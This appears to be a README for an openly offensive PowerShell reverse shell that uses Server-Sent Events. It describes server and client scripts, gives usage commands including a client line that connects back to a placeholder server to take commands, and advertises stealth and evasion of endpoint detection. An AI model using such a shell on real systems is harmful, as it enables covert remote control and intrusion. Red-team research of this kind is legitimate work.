# SSE Reverse Shell – The Quiet Shell No One Saw Coming

This project demonstrates a stealthy reverse shell built using native PowerShell and Server-Sent Events (SSE) — a simple HTTP-based protocol that pushes messages from server to client over a single persistent connection.

Unlike traditional reverse shells that rely on polling, sockets, or external binaries, this one uses only:

- Native PowerShell
- A single GET request
- text/event-stream over HTTP
- Memory-resident execution with minimal noise

## Components

### Start-SseServer.ps1
The SSE server:
- Listens on a specified port using raw TCP
- Pushes commands to clients via SSE
- Receives command output via HTTP POST (/post endpoint)
- Optional interactive terminal or headless mode

### Start-SseClient.ps1
The SSE client:
- Connects to the server’s /sse endpoint
- Receives commands via SSE stream
- Executes them locally and posts results back

## Usage

### Server (interactive terminal):
```
. .\Start-SseServer.ps1
Start-SseServer -Port 8080
```

### Server (headless mode):
```
Start-SseServer -Port 8080 -Headless
```

### Client:
```
. .\Start-SseClient.ps1
Start-SseClient -Uri "http://<server-ip>:8080"
```

## Features
- Fully memory-resident execution
- No need for raw sockets or polling loops
- Can bypass basic EDR/network detections
- Minimalist, stealthy, and flexible

## Screenshots


## Disclaimer

This tool is for educational and research purposes only.
Do not use this on networks or systems you do not own or have explicit permission to test.

## License

MIT License  
Author: TNCX-byte
